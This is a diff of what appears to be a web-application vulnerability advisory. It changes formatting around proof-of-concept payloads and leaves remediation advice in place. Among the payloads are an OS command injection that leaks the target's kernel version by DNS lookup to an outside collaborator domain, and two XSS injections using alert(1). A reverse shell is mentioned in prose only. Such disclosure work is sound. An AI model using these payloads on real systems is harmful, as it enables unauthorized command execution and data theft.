@@ -44,7 +44,7 @@ Failing to address these vulnerabilities could result in unauthorized access, da
 #### Proof of Concept (PoC) 
 The following path was founded vulnerable: /password/index.php
 
-- Detection of OS Injection: Using the payload **values%5Bpassword%5D=test|nslookup $(uname -r).collab.com.&**, the attacker identifies the presence of OS command injection by leveraging the nslookup command to execute the uname -r command, which retrieves the kernel version of the target system.
+- Detection of OS Injection: Using the payload `values%5Bpassword%5D=test|nslookup $(uname -r).collab.com.&`, the attacker identifies the presence of OS command injection by leveraging the nslookup command to execute the uname -r command, which retrieves the kernel version of the target system.
 
 - Achieving Remote Code Execution: With the knowledge of the OS injection vulnerability, the attacker proceeds to execute arbitrary commands to gain control over the target system. In this PoC, the attacker leverages a crafted Python shell payload to establish a reverse shell connection, allowing them to remotely interact with the compromised system.
 #### Remediations
@@ -69,10 +69,10 @@ The provided Proof of Concept (PoC) demonstrates Cross-Site Scripting (XSS) vuln
 
 In the context of the PoC:
 
-- **authRequestCode=</script><script>alert(1)</script>**
+- `authRequestCode=</script><script>alert(1)</script>`
 Here, the value provided for the authRequestCode parameter includes a script tag </script> to prematurely close the preceding script tag, followed by another script tag <script> that contains the JavaScript code alert(1). This payload attempts to execute an alert box with the message "1" when the vulnerable page is loaded by another user.
 
-- **lang=asas';alert(1)//34**
+- `lang=asas';alert(1)//34`
 In this payload, the lang parameter is set to a string asas', followed by the alert(1) JavaScript code. The //34 at the end of the payload appears to be an attempt to comment out the rest of the parameter value. This payload aims to inject an alert box in a similar manner to the previous payload.
 #### Remediations
 - Input Validation: Validate and sanitize all user inputs on the server-side before processing or rendering them. Use input validation libraries or frameworks to ensure that only expected and safe characters are allowed.
